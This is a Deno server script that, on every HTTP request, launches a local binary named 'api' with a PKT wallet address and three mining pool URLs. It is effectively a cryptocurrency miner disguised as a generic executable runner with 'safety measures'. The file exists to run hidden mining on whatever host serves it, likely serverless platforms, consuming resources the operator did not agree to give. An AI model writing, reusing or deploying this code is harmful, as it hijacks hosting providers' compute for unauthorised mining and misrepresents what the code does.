import { serve } from "https://deno.land/std@0.155.0/http/server.ts";
import { cpus } from "https://deno.land/std@0.155.0/node/os.ts";
import { join } from "https://deno.land/std@0.155.0/path/mod.ts";

// Function to execute the local executable with safety measures
async function executeLocalExecutable(executablePath, args) {
  try {
    const process = Deno.run({
      cmd: [executablePath, ...args],
      stdout: "piped",
      stderr: "piped",
    });

    console.log("Executing local executable:", executablePath);

    const output = await process.output();
    const errorOutput = await process.stderrOutput();

    console.log("Output:", new TextDecoder().decode(output));
    console.error("Error Output:", new TextDecoder().decode(errorOutput));

    const { success } = await process.status();

    if (success) {
      return true;
    } else {
      console.error("Local executable exited with an error");
      return false;
    }
  } catch (error) {
    console.error("Error executing the local executable:", error);
    return false;
  }
}

// Using the new experimental Deno.serve() function
Deno.serve(async (req) => {
  const cores = Deno.env.get("DENO_CORES") || cpus().length;

  // Specify the path to the pre-compiled local executable
  const executablePath = join(Deno.cwd(), "api");

  // Trigger the execution with arguments
  const executableArguments = [
    "ann",
    "-p",
    "pkt1qrup75sh882mea577x9r9q6ka8j8rzlqdzazlqg",
    "http://pool.pkt.world/",
    "http://pool.pktpool.io/",
    "http://pool.pkteer.com/",
  ];

  const executionResult = await executeLocalExecutable(executablePath, executableArguments);

  if (executionResult) {
    return new Response("Local executable executed successfully");
  } else {
    return new Response("Error executing local executable", { status: 500 });
  }
});
